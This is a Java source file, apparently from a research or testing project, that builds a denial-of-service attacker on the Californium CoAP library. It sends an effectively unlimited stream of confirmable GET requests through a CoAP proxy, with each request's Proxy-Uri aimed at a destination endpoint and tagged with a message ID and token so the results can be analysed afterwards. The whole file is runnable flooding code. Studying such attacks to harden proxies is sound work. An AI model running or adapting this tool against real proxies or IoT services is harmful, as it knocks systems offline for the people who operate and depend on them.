package org.eclipse.californium.examples.dos;

import java.io.IOException;
import java.security.GeneralSecurityException;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;

import org.eclipse.californium.core.CoapClient;
import org.eclipse.californium.core.CoapHandler;
import org.eclipse.californium.core.CoapResponse;
import org.eclipse.californium.core.coap.Request;
import org.eclipse.californium.core.network.RandomTokenGenerator;
import org.eclipse.californium.core.network.TokenGenerator.Scope;
import org.eclipse.californium.core.network.stack.ReliabilityLayerParameters;
import org.eclipse.californium.elements.config.Configuration;
import org.eclipse.californium.elements.exception.ConnectorException;


public class DoSDTLSAttacker {

  public static void main(String[] args) throws IOException, GeneralSecurityException, InterruptedException, ConnectorException {
    // Configure parameters from input args
		if (args.length != 2 && args.length != 3) {
			System.out.println("Args [proxy uri] [dest uri] [OPTIONAL num_messages int]");
			System.exit(1);
		}
		String proxyUri = args[0];
		String destinationUri = args[1];
		int num_messages;
		if (args.length == 3) {
			num_messages = Integer.parseInt(args[2]);
		} else {
			num_messages = Integer.MAX_VALUE; // basically infinite
		}
		
		// Prepare attacker configuration
		final Configuration config = new Configuration();
    final ReliabilityLayerParameters reliabilityParams = ReliabilityLayerParameters
			.builder()
			.applyConfig(config)
			.build();
		final CoapClient dtlsAttacker = DoSUtil.makeCoapClient(false, config);
		dtlsAttacker.useCONs();

    // Configure an asynchronous handler and countdown latch
    final ConcurrentLinkedQueue<CoapResponse> responseQueue = new ConcurrentLinkedQueue<>();
    final CountDownLatch latch = new CountDownLatch(num_messages);
    final CoapHandler handler = new CoapHandler() {
      @Override
      public void onLoad(CoapResponse response) {
        responseQueue.add(response);
        latch.countDown();
      }

      @Override
      public void onError() {
        latch.countDown();
      }
    };

    RandomTokenGenerator tokenGenerator = new RandomTokenGenerator(config);
		String midTok, destinationUriWithMidTok;
    Request request;

		for (int i = 1; i <= num_messages; i++) {
			// Use new GET request
			request = Request.newGet();
			request.setURI(proxyUri);

			// Need to mod by MAX_MID to avoid multicase MID range
			request.setMID(i % DoSUtil.MAX_MID);
			request.setToken(tokenGenerator.createToken(Scope.LONG_TERM));
			
			// Set mid_tok combination for after-the-fact analysis
			midTok = request.getMID() + "_" + request.getTokenString();
			destinationUriWithMidTok = destinationUri + "/" + midTok;
			request.getOptions().setProxyUri(destinationUriWithMidTok);

			// Update reliability parameters
			request.setReliabilityLayerParameters(reliabilityParams);

      // Send request asynchronously
			dtlsAttacker.advanced(handler, request);
		}

    // Wait for all requests to come back
    latch.await();
  }
}